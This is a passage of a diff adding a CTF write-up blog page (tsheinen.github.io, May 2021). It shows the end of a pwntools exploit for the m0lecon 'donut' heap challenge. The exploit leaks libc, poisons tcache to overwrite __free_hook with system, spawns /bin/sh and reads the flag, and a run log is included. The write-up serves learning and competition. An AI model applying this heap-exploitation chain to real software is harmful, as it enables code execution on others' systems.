+</span><span>    pop_rsp </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x32b5a
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;leaked program base: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span>(program_base))
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;leaked libc base: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span>(libc_base))
+</span><span>
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># add a chunk to tcache
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># it&#39;ll get overwritten later, but it is still needed
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># because tcache stores the count apart from the linked list
+</span><span>    chunk </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">create_donut</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;abc&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;t&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#f28779;">hex</span><span>(chunk)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># create a big chunk with a fake chunk inside it
+</span><span>    fake_chunk_data </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;AAAAAAA&quot;
+</span><span>    fake_chunk_data </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0x21</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">0x20
+</span><span>    fake_chunk </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">create_donut</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">512</span><span style="color:#ccc9c2cc;">, </span><span>fake_chunk_data)
+</span><span>    
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># free the fake chunk
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># this means that we have a chunk in tcachebins that we can control the metadata
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># because the metadata is inside another chunk
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;t&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#f28779;">hex</span><span>(fake_chunk </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x10</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># free the parent chunk so we can recycle it by creating another name of size 512
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;t&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#f28779;">hex</span><span>(fake_chunk)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># so we&#39;re going to reallocate the parent chunk with an altered fake chunk
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># specifically, we&#39;re overwriting the next pointer (tcachebins are a linked list)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># what this means is that we can add an (almost) arbitrary pointer to tcachebins
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># which malloc will return later
+</span><span>
+</span><span>    fake_chunk_data </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;AAAAAAA&quot;
+</span><span>    fake_chunk_data </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0x20</span><span>)
+</span><span>    fake_chunk_data </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(free_hook </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">1</span><span>) </span><span style="font-style:italic;color:#5c6773;"># -1 because the first allocated by is used to store cookie size
+</span><span>
+</span><span>    fake_chunk </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">create_donut</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">512</span><span style="color:#ccc9c2cc;">, </span><span>fake_chunk_data)
+</span><span>
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># at this point, tcachebins has two chunks; our fake chunk and our free_hook &quot;chunk&quot;
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># Chunk(addr=0x560443eff710, size=0x20, flags=)  ←  Chunk(addr=0x7f892ae57b27, size=0x0, flags=) 
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># so we allocate a throwaway chunk and then a chunk which we use to overwrite free_hook
+</span><span>
+</span><span>    </span><span style="color:#ffd580;">create_donut</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;fake idk&quot;</span><span>)
+</span><span>    </span><span style="color:#ffd580;">create_donut</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">p64</span><span>(system))
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># when free_hook gets called rdi is the address being freed
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># so we make a chunk containing /bin/sh
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># and then free it (+1 bc cookie size is stored in char 0)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># calling system(&quot;/bin/sh&quot;)
+</span><span>
+</span><span>    binsh_addr </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">create_donut</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/bin/sh&quot;</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;/bin/sh chunk location at: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span>(binsh_addr))
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;t&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#f28779;">hex</span><span>(binsh_addr)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">import </span><span>time
+</span><span>
+</span><span>    time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;cat flag.txt; exit;&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;l&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>((</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag found: &quot; </span><span style="color:#f29e74;">+ </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;(ptm{.*})&quot;</span><span style="color:#ccc9c2cc;">, </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>())
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ python solve.py REMOTE
+</span><span>[*] &#39;/home/sky/Dropbox/ctf/m0lecon-teaser/donut/donut&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Full RELRO
+</span><span>    Stack:    Canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span><span>    RUNPATH:  b&#39;.&#39;
+</span><span>[*] &#39;/home/sky/Dropbox/ctf/m0lecon-teaser/donut/libc.so.6&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    Canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span><span>[*] &#39;/home/sky/Dropbox/ctf/m0lecon-teaser/donut/ld-2.31.so&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span><span>[+] Opening connection to challs.m0lecon.it on port 1743: Done
+</span><span>Solving PoW...
+</span><span>Solved!
+</span><span>/home/sky/Dropbox/ctf/m0lecon-teaser/donut/solve.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+</span><span>  p.sendline(starting + str(i))
+</span><span>[*] leaked heap chunk address: 0x558e5bb9bac0
+</span><span>[*] leaked mmapped address: 0x7fccca4c9010
+</span><span>[*] leaked program base: 0x558e5bb93400
+</span><span>[*] leaked libc base: 0x7fccca6cd000
+</span><span>[*] /bin/sh chunk location at: 0x558e5bb9bd11
+</span><span>[+] Receiving all data: Done (475B)
+</span><span>[*] Closed connection to challs.m0lecon.it port 1743
+</span><span>[*] flag found: ptm{l1bc_l34k_fl4v0ur3d_d0nu7!_ae56b25f73}
+</span><span>[*] Switching to interactive mode
+</span><span>[*] Got EOF while reading in interactive
+</span><span>$  
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">15 May 2021</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
